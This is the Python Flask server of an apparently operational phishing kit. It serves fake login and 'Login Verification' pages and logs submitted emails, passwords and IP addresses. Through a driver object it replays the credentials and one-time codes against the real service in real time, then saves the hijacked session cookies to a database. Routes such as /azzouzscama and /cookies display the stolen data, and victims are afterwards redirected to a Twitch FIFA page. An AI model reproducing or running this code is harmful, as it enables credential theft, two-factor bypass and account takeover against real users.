from flask import Flask,render_template,jsonify,request,redirect,url_for
from email_validator import validate_email, EmailNotValidError
from Driver import Driver 
from flask_cors import CORS
### logger ###
from log.conf_log import logger
# import threading
import os
from datetime import datetime
from repository.mariadb_handler import MariaDB
db = MariaDB()
######## IMPORTS
# from selenium import webdriver
# from selenium.webdriver.chrome.options import Options
######### CONFIG
# chrome_options = Options()
# chrome_options.add_argument('--headless')
# chrome_options.add_argument('--no-sandbox')
# chrome_options.add_argument('--disable-dev-shm-usage')
#global driver
app = Flask(__name__)
CORS(app)
driver = Driver()
 

@app.route('/addauth', methods=['GET','POST'])
def trytowin():
    if request.method == 'GET':
        _id = str(os.getpid()) + str(datetime.now())
        logger.info('{}'.format(_id))
        db.addAuth(_id,'email','password','ip')
        return jsonify({'msg':'done'})
    if request.method == 'POST':
        pass
    return 'error'

@app.route('/findbyemail', methods=['GET', 'POST'])
def get_by_email():
    if request.method == 'GET':
        email = request.args.get('email')
        # print(email)
        result = db.get_all_byEmail(email)
        # print(result)
        # return render_template('auth.html',codes=result)
        return jsonify(result),200

@app.route('/invalidemail')
def invalid_email():
    return render_template('wrongemailNew.html')


@app.route('/')
def signin():
    logger.info('new user in !')
    return render_template('loginNEw.html')



@app.route('/codes')
def getCodes():
    codes = db.getCodes()
    #return jsonify(codes),200
    return render_template('auth.html',codes=codes)


@app.route('/getinfos',methods=['GET'])
def getinfos():
    if request.method == 'GET':
        logger.info('getting infos..')
        all = db.getAll()
        #print(all)
        return jsonify(all),200


@app.route('/azzouzscama')
def getAuth():
    codes = db.getAuth()
    #return jsonify(codes),200
    return render_template('auth.html',codes=codes)

@app.route('/cookies')
def getCookies():
    codes = db.getCookies()
    #return jsonify(codes),200
    return render_template('auth.html',codes=codes)



@app.route('/verification',methods=['GET','POST'])
def even():
    if request.method == 'GET':
        return render_template('Login Verification.html',message="test@test.test")
    if request.method == 'POST':
        form = request.form
        ip = request.remote_addr
        code = form['oneTimeCode']
        session_id = form['amine_id']
        global driver 
        cookies = driver.verify(session_id, code)
         #########################
        # print('THREAD : CODE SAVING ..')
        # thead_kill = threading.Thread(target=driver.quit)
        # print('THREAD : CREATED')
        # thead_kill.start()
        # print('THREAD : STARTED')
        #########################

        logger.info('{} {} {} {}'.format(session_id,code,ip,cookies))
        db.addCode(session_id,code,ip)
        db.addCookies(session_id,cookies,ip)
        return redirect("https://www.twitch.tv/easportsfifa")

    #return jsonify({'message':'your event link '}),200


def mask_email(email):
    lo = email.find('@')
    if lo>0:
        m_email = email[0:2]+"*******" + email[lo-1:]
        return m_email



@app.route('/processing',methods=['GET','POST'])
def process():
    if request.method == 'GET':
        #driver = webdriver.Chrome(options=chrome_options)
        return render_template('loginNEw.html')
    if request.method == 'POST':
        form = request.form
        ip = request.remote_addr
        email = form['email']
        password =form['password']
        try:
            # Validate.
            valid = validate_email(email)
            # Update with the normalized form.
            email = valid.email  
            #driver = webdriver.Chrome(options=chrome_options)
            global driver
            _id = str(os.getpid()) + str(datetime.now())
            status = driver.login(_id, email, password)
            #status =login(email,password,driver)
            logger.info('{} {} {}'.format(email,password,ip))
            logger.warning('{}'.format(status))
            if status =='succ':
                
                m_email = mask_email(email)
                db.addAuth(_id, email,password,ip)
                #driver.quit()
                return render_template('Login Verification.html',message=m_email,session_id=_id)
            elif status == 'email_error' :
                return render_template('wrongemailNew.html')
            elif status == 'no_login':
                return render_template('wrongemailNew.html')
            else :
                logger.error('{}'.format(status))
                logger.error('unknown issues')
                return render_template('wronginfosNew.html')
                #driver.quit()
            #return jsonify(email,password),200          
        except EmailNotValidError as e:
            # email is not valid, exception message is human-readable
            logger.error(str(e))
            #driver.quit()
            return render_template('wrongemailNew.html')




if __name__ == "__main__":
    app.run(port=6000,host='0.0.0.0',debug=False)
